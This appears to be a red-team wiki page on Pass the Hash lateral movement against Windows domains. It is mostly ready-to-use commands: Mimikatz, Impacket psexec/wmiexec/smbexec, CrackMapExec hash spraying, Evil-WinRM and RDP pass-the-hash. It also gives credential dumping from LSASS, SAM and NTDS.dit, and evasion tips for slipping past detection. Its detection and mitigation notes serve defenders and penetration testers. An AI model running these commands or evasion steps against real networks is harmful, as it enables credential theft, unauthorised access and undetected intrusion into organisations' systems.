# Pass the Hash (PtH)

> **MITRE ATT&CK**: Lateral Movement > T1550.002 - Use Alternate Authentication Material: Pass the Hash
> **Platforms**: Windows
> **Required Privileges**: Local Administrator on target
> **OPSEC Risk**: Medium

## Strategic Overview

Pass the Hash is the foundational lateral movement technique every red teamer must master. Instead of cracking a captured NTLM hash, the hash itself is used directly to authenticate to remote services. The technique exploits the NTLM challenge-response protocol, where the hash -- not the plaintext password -- is the actual authentication secret. PtH remains effective even in hardened environments because NTLM is rarely fully disabled due to legacy application dependencies. The decision to use PtH versus Pass-the-Ticket or Overpass-the-Hash depends on the target's authentication monitoring maturity and Kerberos availability.

### Decision Matrix: PtH vs PtT vs Overpass-the-Hash

| Factor                          | PtH           | PtT              | Overpass-the-Hash |
|---------------------------------|---------------|-------------------|--------------------|
| Requires NTLM hash              | Yes           | No (needs ticket) | Yes                |
| Authentication protocol used     | NTLM          | Kerberos          | Kerberos           |
| Detected by NTLM monitoring     | Yes           | No                | No                 |
| Works across forest boundaries   | Sometimes     | Yes (with trust)  | Yes                |
| Requires domain controller reach | No            | No                | Yes (TGT request)  |
| Best use case                    | Quick lateral | Stealth lateral   | Stealth + fresh TGT|

## Technical Deep-Dive

### 1. Mimikatz - PtH with New Process

```
# Spawn a new process authenticated as the target user
privilege::debug
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe

# The spawned PowerShell session now authenticates as administrator to remote hosts
# Verify: dir \\TARGET\C$
```

### 2. Impacket psexec.py

```bash
# Full interactive shell via service creation (drops binary)
psexec.py corp.local/administrator@192.168.1.50 -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42

# Execute specific command
psexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42 -c cmd.exe
```

### 3. Impacket wmiexec.py

```bash
# Semi-interactive shell via WMI (no binary drop, no service creation)
wmiexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42

# Preferred over psexec for stealth -- WMI is a legitimate management protocol
```

### 4. Impacket smbexec.py

```bash
# Uses cmd.exe-based service (no binary drop but creates a service)
smbexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42
```

### 5. CrackMapExec / NetExec

```bash
# Single target command execution
crackmapexec smb 192.168.1.50 -u administrator -H e19ccf75ee54e06b06a5907af13cef42 -x "whoami /all"

# Spray hash across a subnet to find where the account has admin
crackmapexec smb 192.168.1.0/24 -u administrator -H e19ccf75ee54e06b06a5907af13cef42

# Use wmiexec method instead of default (smbexec)
crackmapexec smb 192.168.1.50 -u administrator -H e19ccf75ee54e06b06a5907af13cef42 --exec-method wmiexec -x "whoami"
```

### 6. Evil-WinRM

```bash
# WinRM shell using hash -- requires WinRM enabled on target (port 5985/5986)
evil-winrm -i 192.168.1.50 -u administrator -H e19ccf75ee54e06b06a5907af13cef42

# Supports file upload/download, .NET assembly loading, DLL loading
```

### 7. xfreerdp - RDP with PtH

```bash
# Requires Restricted Admin mode enabled on target
# Check: reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
xfreerdp /u:administrator /pth:e19ccf75ee54e06b06a5907af13cef42 /v:192.168.1.50 /cert:ignore

# Enable Restricted Admin remotely (if you have another access vector)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### Hash Extraction Sources

```
# From LSASS memory (requires local admin + SeDebugPrivilege)
mimikatz# sekurlsa::logonpasswords

# From SAM database (local accounts only)
mimikatz# lsadump::sam

# Remote extraction via secretsdump
secretsdump.py corp.local/administrator@192.168.1.50 -hashes :HASH

# From NTDS.dit (domain controller -- all domain hashes)
secretsdump.py corp.local/administrator@DC01 -hashes :HASH -just-dc-ntlm
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4624** (Logon Type 3 - Network) with NTLM authentication from unexpected source workstations
- **Event ID 4776** (NTLM credential validation) with unusual account-to-host patterns
- Source workstation names that do not match the actual hostname of the connecting machine
- EDR lateral movement alerts on process injection patterns from Mimikatz pth
- Unusual ADMIN$ or C$ share access patterns outside normal admin behavior

### Evasion Techniques

- Perform PtH from expected admin workstations (PAWs) when possible to blend into normal traffic
- Use Overpass-the-Hash (request Kerberos TGT with the hash) to avoid NTLM-specific detections
- Prefer AES256 keys over NTLM hashes: `sekurlsa::pth /user:admin /domain:corp.local /aes256:KEY`
- Use wmiexec instead of psexec to avoid service creation and binary drop artifacts
- Time lateral movement during business hours when admin activity is expected
- Limit the number of targets accessed in a short window to avoid spray detection

### Mitigations to Be Aware Of

- Credential Guard prevents NTLM hash extraction from LSASS
- Protected Users group forces Kerberos-only, no NTLM caching
- Local Administrator Password Solution (LAPS) randomizes local admin passwords
- SMB signing prevents relay but does not prevent direct PtH

## Cross-References

- [[overpass-the-hash]] - Preferred stealth alternative using Kerberos
- [[pass-the-ticket]] - When you have tickets instead of hashes
- [[psexec-smbexec]] - Execution methods that chain with PtH
- [[wmi-lateral]] - WMI-based execution using PtH credentials
- Section 06: Credential Access - Hash extraction techniques
- Section 08: Privilege Escalation - Obtaining admin hashes

## References

- https://attack.mitre.org/techniques/T1550/002/
- https://www.thehacker.recipes/ad/movement/ntlm/pth
- https://blog.ropnop.com/practical-usage-of-ntlm-hashes/
- https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
